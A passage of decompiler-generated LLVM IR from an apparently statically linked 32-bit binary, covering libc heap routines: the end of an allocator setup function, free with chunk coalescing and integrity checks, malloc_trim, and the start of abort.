  store i32 %v0_805094b, i32* %v3_805094b, align 4
  store i32 %v1_8050884, i32* %eax.global-to-local, align 4
  %v0_8050952 = load i32, i32* @edx, align 4
  %v1_8050952 = load i32, i32* @ecx, align 4
  %v2_8050952 = add i32 %v1_8050952, 8
  %v3_8050952 = inttoptr i32 %v2_8050952 to i32*
  store i32 %v0_8050952, i32* %v3_8050952, align 4
  %v0_8050955 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050955 = load i32, i32* @ecx, align 4
  %v2_8050955 = add i32 %v1_8050955, 12
  %v3_8050955 = inttoptr i32 %v2_8050955 to i32*
  store i32 %v0_8050955, i32* %v3_8050955, align 4
  %v0_8050958 = load i32, i32* @edi, align 4
  %v1_8050958 = load i32, i32* @ecx, align 4
  %v3_8050958 = add i32 %v1_8050958, %v0_8050958
  %v4_8050958 = inttoptr i32 %v3_8050958 to i32*
  store i32 %v0_8050958, i32* %v4_8050958, align 4
  br label %dec_label_pc_805096d

dec_label_pc_805095d:                             ; preds = %dec_label_pc_80508fc
  %v0_805095d = load i32, i32* @edi, align 4
  %v2_805095d = add i32 %v0_805095d, %v1_8050904
  %v1_8050960 = or i32 %v2_805095d, 1
  store i32 %v1_8050960, i32* %eax.global-to-local, align 4
  %v1_8050963 = load i32, i32* @ecx, align 4
  %v2_8050963 = add i32 %v1_8050963, 4
  %v3_8050963 = inttoptr i32 %v2_8050963 to i32*
  store i32 %v1_8050960, i32* %v3_8050963, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_805096a = load i32, i32* @ecx, align 4
  store i32 %v0_805096a, i32* %v3_805096a, align 4
  br label %dec_label_pc_805096d

dec_label_pc_805096d:                             ; preds = %dec_label_pc_8050939, %dec_label_pc_805095d
  store i32 %v3_80508bf, i32* @ecx, align 4
  %v1_8050971 = icmp eq i32 %v3_80508bf, 0
  %v1_8050973 = icmp eq i1 %v1_8050971, false
  br i1 %v1_8050973, label %dec_label_pc_80508bf, label %dec_label_pc_8050979

dec_label_pc_8050979:                             ; preds = %dec_label_pc_805096d, %dec_label_pc_80508ab
  store i32 %v4_80508a3, i32* @ecx, align 4
  %v15_805097d = icmp eq i32 %v0_80508b9, %v4_80508a3
  br i1 %v15_805097d, label %dec_label_pc_8050a01, label %dec_label_pc_8050983

dec_label_pc_8050983:                             ; preds = %dec_label_pc_8050979
  %v4_8050983 = add i32 %v0_80508b9, 4
  br label %dec_label_pc_80508ab

dec_label_pc_805098d:                             ; preds = %dec_label_pc_805099c.preheader, %dec_label_pc_805098d
  %v1_805099120 = phi i32 [ 1, %dec_label_pc_805099c.preheader ], [ %v0_805099c.pre, %dec_label_pc_805098d ]
  %v2_8050991 = mul i32 %v1_805099120, 8
  %v4_8050991 = add i32 %v3_8050991, %v2_8050991
  store i32 %v4_8050991, i32* %eax.global-to-local, align 4
  %v1_8050995 = add i32 %v1_805099120, 1
  store i32 %v1_8050995, i32* %edx.global-to-local, align 4
  %v2_8050996 = add i32 %v4_8050991, 12
  %v3_8050996 = inttoptr i32 %v2_8050996 to i32*
  store i32 %v4_8050991, i32* %v3_8050996, align 4
  %v0_8050999 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050999 = add i32 %v0_8050999, 8
  %v3_8050999 = inttoptr i32 %v2_8050999 to i32*
  store i32 %v0_8050999, i32* %v3_8050999, align 4
  %v0_805099c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805099f = icmp sgt i32 %v0_805099c.pre, 95
  br i1 %v7_805099f, label %dec_label_pc_80509a1, label %dec_label_pc_805098d

dec_label_pc_80509a1:                             ; preds = %dec_label_pc_805098d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80509a5 = add i32 %tmp11, 864
  %v2_80509a5 = inttoptr i32 %v1_80509a5 to i32*
  %v3_80509a5 = load i32, i32* %v2_80509a5, align 4
  %v4_80509a5 = or i32 %v3_80509a5, 1
  store i32 %v4_80509a5, i32* %v2_80509a5, align 4
  %v0_80509ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80509ac = add i32 %v0_80509ac, 840
  %v2_80509ac = inttoptr i32 %v1_80509ac to i32*
  store i32 0, i32* %v2_80509ac, align 4
  %v0_80509b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80509b6 = add i32 %v0_80509b6, 852
  %v2_80509b6 = inttoptr i32 %v1_80509b6 to i32*
  store i32 65536, i32* %v2_80509b6, align 4
  %v0_80509c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80509c0 = add i32 %v0_80509c0, 844
  %v2_80509c0 = inttoptr i32 %v1_80509c0 to i32*
  store i32 262144, i32* %v2_80509c0, align 4
  %v0_80509ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80509ca = add i32 %v0_80509ca, 836
  %v2_80509ca = inttoptr i32 %v1_80509ca to i32*
  store i32 262144, i32* %v2_80509ca, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_80509db = load i32, i32* %arg1, align 4
  %v1_80509dd = urem i32 %v2_80509db, 4
  %v1_80509e0 = or i32 %v1_80509dd, 72
  store i32 %v1_80509e0, i32* %arg1, align 4
  %v0_80509e5 = load i32, i32* @edx, align 4
  %v1_80509e7 = add i32 %v0_80509e5, 52
  store i32 %v1_80509e7, i32* %eax.global-to-local, align 4
  %v2_80509ea = add i32 %v0_80509e5, 44
  %v3_80509ea = inttoptr i32 %v2_80509ea to i32*
  store i32 %v1_80509e7, i32* %v3_80509ea, align 4
  %v1_80509ef = call i32 @sysconf(i32 30)
  store i32 %v1_80509ef, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80509fb = add i32 %tmp11, 860
  %v3_80509fb = inttoptr i32 %v2_80509fb to i32*
  store i32 %v1_80509ef, i32* %v3_80509fb, align 4
  br label %dec_label_pc_8050a01

dec_label_pc_8050a01:                             ; preds = %dec_label_pc_8050979, %dec_label_pc_80509a1
  store i32 %v0_8050864, i32* @ebx, align 4
  store i32 %v0_8050863, i32* @esi, align 4
  store i32 %v0_8050862, i32* @edi, align 4
  %v0_8050a08 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050a08

; uselistorder directives
  uselistorder i32 %v0_8050999, { 1, 0 }
  uselistorder i32 %v0_8050958, { 1, 0 }
  uselistorder i32 %v1_8050913, { 1, 0 }
  uselistorder i32 %v2_805090c, { 1, 0 }
  uselistorder i32 %v1_8050904, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050910, { 1, 0 }
  uselistorder i32 %v3_80508bf, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80508dc, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80508b9, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805096a, { 1, 0 }
  uselistorder i32 %v1_8050884, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8050a01, { 1, 0 }
  uselistorder label %dec_label_pc_805098d, { 1, 0 }
  uselistorder label %dec_label_pc_805096d, { 1, 0 }
  uselistorder label %dec_label_pc_8050939, { 1, 0 }
  uselistorder label %dec_label_pc_8050931, { 1, 0 }
  uselistorder label %dec_label_pc_80508fc, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050a09 = load i32, i32* @ebp, align 4
  %v0_8050a0a = load i32, i32* @edi, align 4
  %v0_8050a0b = load i32, i32* @esi, align 4
  %v0_8050a0c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050a14 = icmp eq i32 %arg1, 0
  br i1 %v1_8050a14, label %dec_label_pc_8050b9d, label %dec_label_pc_8050a1c

dec_label_pc_8050a1c:                             ; preds = %entry
  %v2_8050a27 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050a27, i32* @eax, align 4
  %v2_8050a2c = call i32 @__pthread_return_void(i32 %v2_8050a27, i32 134550975)
  store i32 %v2_8050a2c, i32* %eax.global-to-local, align 4
  %v1_8050a38 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599b0.224 to i32))
  %v1_8050a3d = add i32 %arg1, -8
  store i32 %v1_8050a3d, i32* @ecx, align 4
  %v0_8050a40 = load i8, i8* @global_var_805fe20.225, align 1
  %v1_8050a40 = sext i8 %v0_8050a40 to i32
  store i32 %v1_8050a40, i32* %eax.global-to-local, align 4
  %v1_8050a48 = add i32 %arg1, -4
  %v2_8050a48 = inttoptr i32 %v1_8050a48 to i32*
  %v3_8050a48 = load i32, i32* %v2_8050a48, align 4
  %v1_8050a4d = and i32 %v3_8050a48, -4
  %v4_8050a4d = trunc i32 %v1_8050a4d to i8
  store i32 %v1_8050a4d, i32* @ebx, align 4
  %v8_8050a52 = icmp ugt i8 %v4_8050a4d, %v0_8050a40
  br i1 %v8_8050a52, label %dec_label_pc_8050a74, label %dec_label_pc_8050a54

dec_label_pc_8050a54:                             ; preds = %dec_label_pc_8050a1c
  %v2_8050a54 = udiv i32 %v3_8050a48, 8
  %v1_8050a57 = or i32 %v1_8050a40, 3
  %v3_8050a57 = trunc i32 %v1_8050a57 to i8
  store i32 %v1_8050a57, i32* %eax.global-to-local, align 4
  store i8 %v3_8050a57, i8* @global_var_805fe20.225, align 32
  %v1_8050a5f = mul nuw i32 %v2_8050a54, 4
  %v2_8050a5f = add i32 %v1_8050a5f, ptrtoint (i8* @global_var_805fe20.225 to i32)
  store i32 %v2_8050a5f, i32* @edx, align 4
  %v1_8050a66 = add i32 %v1_8050a5f, add (i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32 -4)
  %v2_8050a66 = inttoptr i32 %v1_8050a66 to i32*
  %v3_8050a66 = load i32, i32* %v2_8050a66, align 4
  store i32 %v3_8050a66, i32* %eax.global-to-local, align 4
  %v3_8050a69 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8050a66, i32* %v3_8050a69, align 4
  %v0_8050a6c = load i32, i32* @ecx, align 4
  %v1_8050a6c = load i32, i32* @edx, align 4
  %v2_8050a6c = add i32 %v1_8050a6c, -4
  %v3_8050a6c = inttoptr i32 %v2_8050a6c to i32*
  store i32 %v0_8050a6c, i32* %v3_8050a6c, align 4
  br label %dec_label_pc_8050b8c

dec_label_pc_8050a74:                             ; preds = %dec_label_pc_8050a1c
  %v1_8050a74 = trunc i32 %v3_8050a48 to i8
  %v2_8050a74 = and i8 %v1_8050a74, 2
  %v3_8050a74 = icmp eq i8 %v2_8050a74, 0
  %v5_8050a74 = zext i8 %v2_8050a74 to i32
  %v7_8050a74 = and i32 %v3_8050a48, -256
  %v8_8050a74 = or i32 %v5_8050a74, %v7_8050a74
  store i32 %v8_8050a74, i32* @edx, align 4
  %v1_8050a77 = icmp eq i1 %v3_8050a74, false
  br i1 %v1_8050a77, label %dec_label_pc_8050b6c, label %dec_label_pc_8050a7d

dec_label_pc_8050a7d:                             ; preds = %dec_label_pc_8050a74
  %v1_8050a7d = or i32 %v1_8050a40, 1
  %v3_8050a7d = trunc i32 %v1_8050a7d to i8
  store i32 %v1_8050a7d, i32* %eax.global-to-local, align 4
  %v2_8050a80 = add i32 %v1_8050a4d, %v1_8050a3d
  store i32 %v2_8050a80, i32* @esi, align 4
  store i8 %v3_8050a7d, i8* @global_var_805fe20.225, align 32
  %v1_8050a88 = add i32 %v2_8050a80, 4
  %v2_8050a88 = inttoptr i32 %v1_8050a88 to i32*
  %v3_8050a88 = load i32, i32* %v2_8050a88, align 4
  store i32 %v3_8050a88, i32* %eax.global-to-local, align 4
  %v2_8050a8f = inttoptr i32 %v1_8050a48 to i8*
  %v3_8050a8f = load i8, i8* %v2_8050a8f, align 1
  %v4_8050a8f = urem i8 %v3_8050a8f, 2
  %v5_8050a8f = icmp eq i8 %v4_8050a8f, 0
  %v1_8050a93 = icmp eq i1 %v5_8050a8f, false
  br i1 %v1_8050a93, label %dec_label_pc_8050ab6, label %dec_label_pc_8050a95

dec_label_pc_8050a95:                             ; preds = %dec_label_pc_8050a7d
  %v2_8050a95 = inttoptr i32 %v1_8050a3d to i32*
  %v3_8050a95 = load i32, i32* %v2_8050a95, align 4
  store i32 %v3_8050a95, i32* @ebp, align 4
  %v2_8050a9a = sub i32 %v1_8050a3d, %v3_8050a95
  store i32 %v2_8050a9a, i32* %eax.global-to-local, align 4
  %v1_8050a9c = add i32 %v2_8050a9a, 8
  %v2_8050a9c = inttoptr i32 %v1_8050a9c to i32*
  %v3_8050a9c = load i32, i32* %v2_8050a9c, align 4
  store i32 %v3_8050a9c, i32* @edi, align 4
  %v1_8050a9f = add i32 %v2_8050a9a, 12
  %v2_8050a9f = inttoptr i32 %v1_8050a9f to i32*
  %v3_8050a9f = load i32, i32* %v2_8050a9f, align 4
  store i32 %v3_8050a9f, i32* @edx, align 4
  %v1_8050aa2 = add i32 %v3_8050a9c, 12
  %v2_8050aa2 = inttoptr i32 %v1_8050aa2 to i32*
  %v3_8050aa2 = load i32, i32* %v2_8050aa2, align 4
  store i32 %v3_8050aa2, i32* @ecx, align 4
  %v12_8050aa5 = icmp eq i32 %v3_8050aa2, %v2_8050a9a
  %v1_8050aa7 = icmp eq i1 %v12_8050aa5, false
  br i1 %v1_8050aa7, label %dec_label_pc_8050ae5, label %dec_label_pc_8050aa9

dec_label_pc_8050aa9:                             ; preds = %dec_label_pc_8050a95
  %v1_8050aa9 = add i32 %v3_8050a9f, 8
  %v2_8050aa9 = inttoptr i32 %v1_8050aa9 to i32*
  %v3_8050aa9 = load i32, i32* %v2_8050aa9, align 4
  %v15_8050aa9 = icmp eq i32 %v3_8050aa9, %v3_8050aa2
  %v1_8050aac = icmp eq i1 %v15_8050aa9, false
  br i1 %v1_8050aac, label %dec_label_pc_8050ae5, label %dec_label_pc_8050aae

dec_label_pc_8050aae:                             ; preds = %dec_label_pc_8050aa9
  %v2_8050aae = add i32 %v3_8050a95, %v1_8050a4d
  store i32 %v2_8050aae, i32* @ebx, align 4
  store i32 %v3_8050a9f, i32* %v2_8050aa2, align 4
  %v0_8050ab3 = load i32, i32* @edi, align 4
  %v1_8050ab3 = load i32, i32* @edx, align 4
  %v2_8050ab3 = add i32 %v1_8050ab3, 8
  %v3_8050ab3 = inttoptr i32 %v2_8050ab3 to i32*
  store i32 %v0_8050ab3, i32* %v3_8050ab3, align 4
  %v0_8050abd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050ab6

dec_label_pc_8050ab6:                             ; preds = %dec_label_pc_8050a7d, %dec_label_pc_8050aae
  %v1_8050ac9 = phi i32 [ %v2_8050a80, %dec_label_pc_8050a7d ], [ %v0_8050abd.pre, %dec_label_pc_8050aae ]
  %v1_8050aba = and i32 %v3_8050a88, -4
  store i32 %v1_8050aba, i32* @ebp, align 4
  %v1_8050abd = load i32, i32* @global_var_805fe4c.226, align 4
  %v12_8050abd = icmp eq i32 %v1_8050ac9, %v1_8050abd
  br i1 %v12_8050abd, label %dec_label_pc_8050b17, label %dec_label_pc_8050ac5

dec_label_pc_8050ac5:                             ; preds = %dec_label_pc_8050ab6
  %v2_8050ac5 = add i32 %v1_8050ac9, 4
  %v3_8050ac5 = add i32 %v2_8050ac5, %v1_8050aba
  %v4_8050ac5 = inttoptr i32 %v3_8050ac5 to i32*
  %v5_8050ac5 = load i32, i32* %v4_8050ac5, align 4
  store i32 %v5_8050ac5, i32* %eax.global-to-local, align 4
  %v3_8050ac9 = inttoptr i32 %v2_8050ac5 to i32*
  store i32 %v1_8050aba, i32* %v3_8050ac9, align 4
  %v0_8050acc = load i32, i32* %eax.global-to-local, align 4
  %v1_8050acc = urem i32 %v0_8050acc, 2
  %v2_8050acc = icmp eq i32 %v1_8050acc, 0
  store i32 %v1_8050acc, i32* %eax.global-to-local, align 4
  %v1_8050ad1 = icmp eq i1 %v2_8050acc, false
  br i1 %v1_8050ad1, label %dec_label_pc_8050af2, label %dec_label_pc_8050ad3

dec_label_pc_8050ad3:                             ; preds = %dec_label_pc_8050ac5
  %v0_8050ad3 = load i32, i32* @esi, align 4
  %v1_8050ad3 = add i32 %v0_8050ad3, 8
  %v2_8050ad3 = inttoptr i32 %v1_8050ad3 to i32*
  %v3_8050ad3 = load i32, i32* %v2_8050ad3, align 4
  store i32 %v3_8050ad3, i32* @edx, align 4
  %v1_8050ad6 = add i32 %v0_8050ad3, 12
  %v2_8050ad6 = inttoptr i32 %v1_8050ad6 to i32*
  %v3_8050ad6 = load i32, i32* %v2_8050ad6, align 4
  store i32 %v3_8050ad6, i32* %eax.global-to-local, align 4
  %v1_8050ad9 = add i32 %v3_8050ad3, 12
  %v2_8050ad9 = inttoptr i32 %v1_8050ad9 to i32*
  %v3_8050ad9 = load i32, i32* %v2_8050ad9, align 4
  store i32 %v3_8050ad9, i32* @edi, align 4
  %v12_8050adc = icmp eq i32 %v3_8050ad9, %v0_8050ad3
  %v1_8050ade = icmp eq i1 %v12_8050adc, false
  br i1 %v1_8050ade, label %dec_label_pc_8050ae5, label %dec_label_pc_8050ae0

dec_label_pc_8050ae0:                             ; preds = %dec_label_pc_8050ad3
  %v1_8050ae0 = add i32 %v3_8050ad6, 8
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i32*
  %v3_8050ae0 = load i32, i32* %v2_8050ae0, align 4
  %v15_8050ae0 = icmp eq i32 %v3_8050ae0, %v3_8050ad9
  br i1 %v15_8050ae0, label %dec_label_pc_8050aea, label %dec_label_pc_8050ae5

dec_label_pc_8050ae5:                             ; preds = %dec_label_pc_8050ae0, %dec_label_pc_8050ad3, %dec_label_pc_8050aa9, %dec_label_pc_8050a95
  %v0_8050ae5 = call i32 @abort()
  store i32 %v0_8050ae5, i32* %eax.global-to-local, align 4
  %v1_8050aea.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050aea

dec_label_pc_8050aea:                             ; preds = %dec_label_pc_8050ae0, %dec_label_pc_8050ae5
  %v1_8050aea = phi i32 [ %v3_8050ad3, %dec_label_pc_8050ae0 ], [ %v1_8050aea.pre, %dec_label_pc_8050ae5 ]
  %v0_8050aea = phi i32 [ %v3_8050ad6, %dec_label_pc_8050ae0 ], [ %v0_8050ae5, %dec_label_pc_8050ae5 ]
  %v2_8050aea = add i32 %v1_8050aea, 12
  %v3_8050aea = inttoptr i32 %v2_8050aea to i32*
  store i32 %v0_8050aea, i32* %v3_8050aea, align 4
  %v0_8050aed = load i32, i32* @edx, align 4
  %v1_8050aed = load i32, i32* %eax.global-to-local, align 4
  %v2_8050aed = add i32 %v1_8050aed, 8
  %v3_8050aed = inttoptr i32 %v2_8050aed to i32*
  store i32 %v0_8050aed, i32* %v3_8050aed, align 4
  %v0_8050af0 = load i32, i32* @ebx, align 4
  %v1_8050af0 = load i32, i32* @ebp, align 4
  %v2_8050af0 = add i32 %v1_8050af0, %v0_8050af0
  store i32 %v2_8050af0, i32* @ebx, align 4
  br label %dec_label_pc_8050af2

dec_label_pc_8050af2:                             ; preds = %dec_label_pc_8050ac5, %dec_label_pc_8050aea
  %v0_8050af2 = load i32, i32* @global_var_805fe5c.244, align 4
  store i32 %v0_8050af2, i32* %eax.global-to-local, align 4
  %v0_8050af7 = load i32, i32* @ecx, align 4
  %v1_8050af7 = add i32 %v0_8050af7, 12
  %v2_8050af7 = inttoptr i32 %v1_8050af7 to i32*
  store i32 ptrtoint (i32* @global_var_805fe54.228 to i32), i32* %v2_8050af7, align 4
  %v0_8050afe = load i32, i32* %eax.global-to-local, align 4
  %v1_8050afe = load i32, i32* @ecx, align 4
  %v2_8050afe = add i32 %v1_8050afe, 8
  %v3_8050afe = inttoptr i32 %v2_8050afe to i32*
  store i32 %v0_8050afe, i32* %v3_8050afe, align 4
  %v0_8050b01 = load i32, i32* @ebx, align 4
  %v1_8050b01 = load i32, i32* @ecx, align 4
  %v3_8050b01 = add i32 %v1_8050b01, %v0_8050b01
  %v4_8050b01 = inttoptr i32 %v3_8050b01 to i32*
  store i32 %v0_8050b01, i32* %v4_8050b01, align 4
  %v0_8050b04 = load i32, i32* @ecx, align 4
  %v1_8050b04 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b04 = add i32 %v1_8050b04, 12
  %v3_8050b04 = inttoptr i32 %v2_8050b04 to i32*
  store i32 %v0_8050b04, i32* %v3_8050b04, align 4
  %v0_8050b07 = load i32, i32* @ebx, align 4
  %v1_8050b09 = or i32 %v0_8050b07, 1
  store i32 %v1_8050b09, i32* %eax.global-to-local, align 4
  %v0_8050b0c = load i32, i32* @ecx, align 4
  store i32 %v0_8050b0c, i32* @global_var_805fe5c.244, align 4
  %v2_8050b12 = add i32 %v0_8050b0c, 4
  %v3_8050b12 = inttoptr i32 %v2_8050b12 to i32*
  store i32 %v1_8050b09, i32* %v3_8050b12, align 4
  br label %dec_label_pc_8050b27

dec_label_pc_8050b17:                             ; preds = %dec_label_pc_8050ab6
  %v0_8050b17 = load i32, i32* @ebx, align 4
  %v2_8050b17 = add i32 %v0_8050b17, %v1_8050aba
  store i32 %v2_8050b17, i32* @ebx, align 4
  %v1_8050b1b = or i32 %v2_8050b17, 1
  store i32 %v1_8050b1b, i32* %eax.global-to-local, align 4
  %v1_8050b1e = load i32, i32* @ecx, align 4
  %v2_8050b1e = add i32 %v1_8050b1e, 4
  %v3_8050b1e = inttoptr i32 %v2_8050b1e to i32*
  store i32 %v1_8050b1b, i32* %v3_8050b1e, align 4
  %v0_8050b21 = load i32, i32* @ecx, align 4
  store i32 %v0_8050b21, i32* @global_var_805fe4c.226, align 4
  br label %dec_label_pc_8050b27

dec_label_pc_8050b27:                             ; preds = %dec_label_pc_8050af2, %dec_label_pc_8050b17
  %v0_8050b27 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050b27, 131072
  br i1 %tmp21, label %dec_label_pc_8050b8c, label %dec_label_pc_8050b2f

dec_label_pc_8050b2f:                             ; preds = %dec_label_pc_8050b27
  %v0_8050b2f = load i8, i8* @global_var_805fe20.225, align 32
  %v1_8050b2f = and i8 %v0_8050b2f, 2
  %v2_8050b2f = icmp eq i8 %v1_8050b2f, 0
  br i1 %v2_8050b2f, label %dec_label_pc_8050b48, label %dec_label_pc_8050b38

dec_label_pc_8050b38:                             ; preds = %dec_label_pc_8050b2f
  %v2_8050b40 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805fe20.225 to i32*))
  store i32 %v2_8050b40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b48

dec_label_pc_8050b48:                             ; preds = %dec_label_pc_8050b2f, %dec_label_pc_8050b38
  %v0_8050b48 = load i32, i32* @global_var_805fe4c.226, align 4
  store i32 %v0_8050b48, i32* %eax.global-to-local, align 4
  %v1_8050b4d = add i32 %v0_8050b48, 4
  %v2_8050b4d = inttoptr i32 %v1_8050b4d to i32*
  %v3_8050b4d = load i32, i32* %v2_8050b4d, align 4
  %v1_8050b50 = and i32 %v3_8050b4d, -4
  store i32 %v1_8050b50, i32* %eax.global-to-local, align 4
  %v1_8050b53 = load i32, i32* @global_var_8060164.242, align 4
  %v7_8050b53 = icmp ult i32 %v1_8050b50, %v1_8050b53
  br i1 %v7_8050b53, label %dec_label_pc_8050b8c, label %dec_label_pc_8050b5b

dec_label_pc_8050b5b:                             ; preds = %dec_label_pc_8050b48
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* @edx, align 4
  %v0_8050b60 = load i32, i32* @global_var_8060168.240, align 8
  store i32 %v0_8050b60, i32* @eax, align 4
  %v0_8050b65 = call i32 @__malloc_trim()
  store i32 %v0_8050b65, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b8c

dec_label_pc_8050b6c:                             ; preds = %dec_label_pc_8050a74
  %v2_8050b6c = inttoptr i32 %v1_8050a3d to i32*
  %v3_8050b6c = load i32, i32* %v2_8050b6c, align 4
  %v0_8050b6f = load i32, i32* @global_var_8060170.233, align 16
  %v1_8050b6f = add i32 %v0_8050b6f, -1
  store i32 %v1_8050b6f, i32* @global_var_8060170.233, align 16
  %v2_8050b75 = add i32 %v3_8050b6c, %v1_8050a4d
  store i32 %v2_8050b75, i32* %eax.global-to-local, align 4
  %v2_8050b78 = sub i32 %v1_8050a3d, %v3_8050b6c
  %v0_8050b7e = load i32, i32* @global_var_8060184.236, align 4
  %v2_8050b7e = sub i32 %v0_8050b7e, %v2_8050b75
  store i32 %v2_8050b7e, i32* @global_var_8060184.236, align 4
  %v4_8050b84 = call i32 @munmap(i32 %v2_8050b78, i32 %v2_8050b75, i32 %v1_8050a4d, i32 %v1_8050a4d)
  store i32 %v4_8050b84, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b8c

dec_label_pc_8050b8c:                             ; preds = %dec_label_pc_8050b48, %dec_label_pc_8050b27, %dec_label_pc_8050b5b, %dec_label_pc_8050a54, %dec_label_pc_8050b6c
  store i32 %v2_8050a27, i32* @eax, align 4
  %v2_8050b95 = call i32 @__pthread_return_void(i32 %v2_8050a27, i32 1)
  store i32 %v2_8050b95, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b9d

dec_label_pc_8050b9d:                             ; preds = %entry, %dec_label_pc_8050b8c
  %.0 = phi i32 [ undef, %entry ], [ %v2_8050b95, %dec_label_pc_8050b8c ]
  store i32 %v0_8050a0c, i32* @ebx, align 4
  store i32 %v0_8050a0b, i32* @esi, align 4
  store i32 %v0_8050a0a, i32* @edi, align 4
  store i32 %v0_8050a09, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8050b6c, { 1, 0 }
  uselistorder i32 %v0_8050b01, { 1, 0 }
  uselistorder i32 %v1_8050acc, { 1, 0 }
  uselistorder i32 %v2_8050ac5, { 1, 0 }
  uselistorder i32 %v1_8050aba, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050ac9, { 1, 0 }
  uselistorder i32 %v1_8050a4d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050a48, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050a3d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805fe20.225 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805fe54.228 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805fe4c.226, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_80599b0.224 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050b9d, { 1, 0 }
  uselistorder label %dec_label_pc_8050b8c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050b48, { 1, 0 }
  uselistorder label %dec_label_pc_8050b27, { 1, 0 }
  uselistorder label %dec_label_pc_8050af2, { 1, 0 }
  uselistorder label %dec_label_pc_8050aea, { 1, 0 }
  uselistorder label %dec_label_pc_8050ab6, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050ba5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050bb2 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805fe20.225 to i8) to i32) to i32*))
  %v0_8050bb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050bb7, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805fe20.225 to i32), i32* @edx, align 4
  store i32 %v0_8050ba5, i32* @ebx, align 4
  %v0_8050bc2 = call i32 @__malloc_trim()
  ret i32 %v0_8050bc2

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805fe20.225 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805fe20.225, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050bd4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599c8.245 to i32))
  %v12_8050bde = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050be3

dec_label_pc_8050be3:                             ; preds = %dec_label_pc_8050be3.dec_label_pc_8050be3_crit_edge, %entry
  %v0_8050be3 = phi i32 [ %v12_8050bde, %entry ], [ %v0_8050be3.pre, %dec_label_pc_8050be3.dec_label_pc_8050be3_crit_edge ]
  %v1_8050bee22 = phi i32 [ 31, %entry ], [ %v1_8050bee, %dec_label_pc_8050be3.dec_label_pc_8050be3_crit_edge ]
  %v2_8050be3 = mul i32 %v1_8050bee22, 4
  %v3_8050be3 = add i32 %v2_8050be3, 152
  %v4_8050be3 = add i32 %v3_8050be3, %v0_8050be3
  %v5_8050be3 = inttoptr i32 %v4_8050be3 to i32*
